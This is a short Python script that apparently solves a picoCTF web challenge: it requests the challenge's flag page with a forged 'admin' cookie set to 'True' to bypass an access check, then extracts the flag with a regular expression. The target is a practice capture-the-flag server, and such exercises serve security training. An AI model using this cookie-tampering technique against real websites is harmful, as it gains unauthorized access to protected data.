import requests
import re

def main():
    url = "https://jupiter.challenges.picoctf.org/problem/44573/flag"
    cookie = {'admin':'True'}
    r = requests.get(url,cookies=cookie)
    flag = re.findall(r'picoCTF{.*?}', r.text)[0]
    print(flag)
main()